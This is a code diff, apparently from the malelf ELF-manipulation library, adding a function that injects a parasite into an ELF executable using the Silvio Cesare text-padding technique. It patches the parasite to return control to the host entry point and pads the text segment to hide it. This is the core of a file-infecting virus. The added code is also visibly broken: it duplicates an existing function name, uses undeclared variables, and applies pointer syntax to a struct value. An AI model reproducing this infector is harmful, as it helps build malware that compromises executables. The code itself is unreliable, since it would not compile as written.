@@ -45,8 +45,6 @@
 #include <malelf/patch.h>
 #include <malelf/debug.h>
 
-#define PAGE_SIZE 4096
-
 typedef struct {
         MalelfBinary *host;
         MalelfBinary *parasite;
@@ -55,7 +53,78 @@ typedef struct {
         _u32 infect_offset_at;
         _u32 parasite_vaddr;
         _u32 target_segment;
+        _u32 offset_patch_parasite;
 } MalelfInfect;
+
+static _u32 _malelf_infect_silvio_padding(MalelfBinary *input,
+                                          MalelfBinary *output,
+                                          MalelfInfect *infector,
+                                          Elf32_Phdr *target_phdr)
+{
+        _u32 error = MALELF_SUCCESS;
+        _u32 end_of_text = 0;
+        _u32 last_chunk = 0;
+
+        MALELF_DEBUG_INFO("Inserting parasite. Input binary '%s'"
+                          "Output binary: '%s'",
+                          input->fname,
+                          output->fname);
+
+        error = malelf_binary_add_data(output,
+                                       input,
+                                       0,
+                                       infector->infect_offset_at);
+        if (MALELF_SUCCESS != error) {
+                return error;
+        }
+
+        if (infector->offset_patch_parasite == 0) {
+                error = malelf_patch_at_magic_byte(parasite,
+                                                   magic_bytes,
+                                                   infector->host_entry_point);
+                if (MALELF_SUCCESS != error) {
+                        return error;
+                }
+        } else {
+                error = malelf_patch_at(parasite,
+                                        infector->offset_patch_parasite,
+                                        infector->host_entry_point);
+                if (MALELF_SUCCESS != error) {
+                        return error;
+                }
+        }
+
+        error = malelf_binary_add_data(output,
+                                       parasite,
+                                       0,
+                                       parasite->size);
+        if (MALELF_SUCCESS != error) {
+                return error;
+        }
+
+        for (i = 0; i < (PAGE_SIZE - parasite->size); i++) {
+                error = malelf_binary_add_byte(output,
+                                               "\x00");
+        }
+
+        end_of_text = target_phdr->p_offset + target_phdr->p_filesz;
+
+        assert (output->size == end_of_text);
+
+        last_chunk = input->size - end_of_text;
+
+        error = malelf_binary_add_data(output,
+                                       input,
+                                       last_chunk,
+                                       input->size);
+        if (MALELF_SUCCESS != error) {
+                return error;
+        }
+
+        MALELF_DEBUG_INFO("Successfully infected. (%s)",
+                          output->fname);
+        return MALELF_SUCCESS;
+}
 
 static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
                                   MalelfBinary* output,
@@ -113,7 +182,6 @@ static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
 
         input->mem += end_of_text;
 
-        /* unsigned int sum = end_of_text + PAGE_SIZE; */
         unsigned int last_chunk = input->size - end_of_text;
 
         if ((c = write(output->fd, input->mem, last_chunk)) != last_chunk) {
@@ -243,6 +311,8 @@ _u32 malelf_infect_silvio_padding32_new(MalelfBinary *host,
         MALELF_DEBUG_INFO("Inserting parasite at offset %x vaddr 0x%x\n",
                           infector.infect_offset_at,
                           infector.parasite_vaddr);
+
+        infector->offset_patch_parasite = offset_entry_point;
 
         error = _malelf_infect_silvio_padding(host,
                                               output,
